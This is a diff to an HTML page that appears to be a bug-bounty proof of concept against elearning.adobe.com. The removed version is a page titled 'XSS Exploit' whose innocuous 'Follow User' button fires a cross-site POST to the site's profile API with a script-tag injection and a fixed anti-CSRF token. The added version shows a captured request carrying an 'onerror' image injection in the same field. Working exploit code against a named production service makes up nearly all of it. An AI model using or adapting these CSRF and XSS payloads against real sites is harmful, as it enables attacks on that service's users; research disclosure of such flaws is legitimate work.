@@ -3,30 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Exploit</title>
+    <title>HTTP Request Data</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        pre { background: #f4f4f4; padding: 10px; border-radius: 5px; overflow-x: auto; }
+    </style>
 </head>
 <body>
-    <h1>Click to Follow</h1>
-    <p>Follow a user by clicking the button below</p>
-    <button id="exploitBtn">Follow User</button>
-    
-    <script>
-      document.getElementById('exploitBtn').onclick = function() {
-        const xssPayload = '{"user_id":460972,"followee_user_id":"<script>alert(document.domain)</script>","verbs":[]}';
-        
-        fetch('https://elearning.adobe.com/cpapi/v1/profile/followed', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-Anti-Csrf-Header': '306c623435676767696a7269656b716d38647675646130686d76202d2028343630393732202a2034363039373229',
-            'X-Requested-With': 'XMLHttpRequest'
-          },
-          body: xssPayload
-        })
-        .then(response => response.text())
-        .then(data => console.log('Request Sent'))
-        .catch(error => console.error('Error:', error));
-      }
-    </script>
+    <h2>Captured HTTP Request</h2>
+    <pre>
+POST /cpapi/v1/profile/followed HTTP/2
+Host: elearning.adobe.com
+Content-Length: 95
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+X-Anti-Csrf-Header: 306c623435676767696a7269656b716d38647675646130686d76202d2028343630393732202a2034363039373229
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/plain, */*; q=0.01
+Content-Type: application/json; charset=UTF-8
+Origin: https://elearning.adobe.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: emptyA
+Referer: https://elearning.adobe.com/2025/01/why-are-there-limitations-on-project-dimensions-in-the-all-new-adobe-captivate/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{"user_id":460972,"followee_user_id":"158195d726n<img src=a onerror=alert(1)>hpjxk","verbs":[]}
+    </pre>
 </body>
 </html>
